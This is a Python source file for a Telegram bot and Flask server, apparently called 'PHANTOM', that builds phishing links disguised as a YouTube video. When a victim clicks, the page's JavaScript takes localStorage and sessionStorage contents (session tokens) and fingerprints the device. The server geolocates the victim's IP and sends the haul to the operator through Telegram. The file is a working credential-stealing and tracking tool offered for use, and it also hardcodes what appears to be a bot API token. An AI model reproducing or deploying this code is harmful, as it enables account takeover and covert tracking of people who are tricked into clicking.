import asyncio
import threading
import requests
import uuid
import json
import os
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
exploit_vault = {} 
user_settings = {} 

# --- ОПАСНЫЕ РЕЖИМЫ ---
PAYLOADS = {
    "SESSIONS": {
        "name": "🕵️ Social & Session Leak",
        "js": "d.m='SESS'; d.ls=JSON.stringify(localStorage); d.ss=JSON.stringify(sessionStorage);",
        "desc": "Сбор токенов из LocalStorage и проверка сессий."
    },
    "HARDWARE": {
        "name": "📊 Deep Hardware OSINT",
        "js": "d.m='HARD'; d.c=navigator.hardwareConcurrency; d.p=navigator.platform; d.mem=navigator.deviceMemory;",
        "desc": "Полные характеристики железа и отпечаток браузера."
    }
}

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head><title>YouTube</title><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="margin:0; background:#000; display:flex; flex-direction:column; align-items:center; height:100vh; justify-content:center;" onclick="strike()">
    <div style="position:relative; width:100%; max-width:600px;">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; opacity:0.8;">
        <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:68px; height:48px; background:rgba(255,0,0,0.9); border-radius:12px;">
            <div style="margin:14px 26px; border-left:18px solid #fff; border-top:10px solid transparent; border-bottom:10px solid transparent;"></div>
        </div>
    </div>
    <div style="color:#fff; font-family:sans-serif; padding:15px; width:100%; box-sizing:border-box;">
        <div style="font-size:18px;">Индийский танец крокодила</div>
        <div style="color:#aaa; font-size:12px; margin-top:5px;">2.4 млн просмотров</div>
    </div>
<script>
let sent = false;
async function strike() {
    if(sent) return; sent = true;
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height, ref: document.referrer };
    try { {{ custom_script|safe }} } catch(e) {}
    try { 
        let gl = document.createElement('canvas').getContext('webgl');
        d.gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
        let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%";
    } catch(e) {}
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; });
}
</script>
</body>
</html>
"""

@app.route('/')
def home(): return "C2_SERVER_ONLINE", 200

@app.route('/v/<aid>')
def trap(aid):
    mode = user_settings.get(str(aid), "SESSIONS")
    script = PAYLOADS.get(mode, PAYLOADS["SESSIONS"])["js"]
    return render_template_string(HTML_TRAP, aid=aid, custom_script=script)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    geo = {}
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}").json()
        if r['status'] == 'success': geo = r
    except: pass

    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    exploit_vault[token] = {"client_data": d, "geo_data": geo}

    m = "СЕССИИ" if d.get('m') == 'SESS' else "ЖЕЛЕЗО"
    report = (
        f"☣️ **ДОСТУП ПОЛУЧЕН: {m}**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 IP: `{ip}`\n"
        f"📍 ГЕО: `{geo.get('city', 'N/A')}, {geo.get('country', 'N/A')}`\n"
        f"🏢 ISP: `{geo.get('isp', 'N/A')}`\n"
        f"🗺 [Google Maps](http://www.google.com/maps/place/{geo.get('lat')},{geo.get('lon')})\n\n"
        f"📱 УСТРОЙСТВО:\n"
        f"• GPU: `{d.get('gpu', 'N/A')}`\n"
        f"• Батарея: `{d.get('bat', 'N/A')}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 Токен для дампа: `{token}`"
    )
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🚀 Создать ссылку")
    await message.answer("💀 **PHANTOM FINAL v24.0**\nСервер активен. Жду команд.", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🚀 Создать ссылку")
async def create(message: types.Message):
    kb = InlineKeyboardBuilder()
    for k, v in PAYLOADS.items(): kb.button(text=v["name"], callback_data=f"set_{k}")
    kb.adjust(1)
    await message.answer("Выбери режим атаки:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("set_"))
async def set_mode(callback: types.CallbackQuery):
    mode = callback.data.split("_")[1]
    user_settings[str(callback.from_user.id)] = mode
    link = f"{BASE_URL}/v/{callback.from_user.id}"
    await callback.message.edit_text(f"🔥 **ССЫЛКА ЗАРЯЖЕНА ({mode})**\n\n🔗 `{link}`\n\n*Скинь токен EXP-..., когда придет отчет!*")

@dp.message(F.text.startswith("EXP-"))
async def show_dump(message: types.Message):
    t = message.text.strip().upper()
    if t in exploit_vault:
        dump = json.dumps(exploit_vault[t], indent=2, ensure_ascii=False)
        await message.answer(f"🔓 **ПОЛНЫЙ ДАМП {t}:**\n```json\n{dump}\n```")
    else:
        await message.answer("❌ Токен не найден или устарел.")

async def run_bot():
    await dp.start_polling(bot)

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    asyncio.run(run_bot())
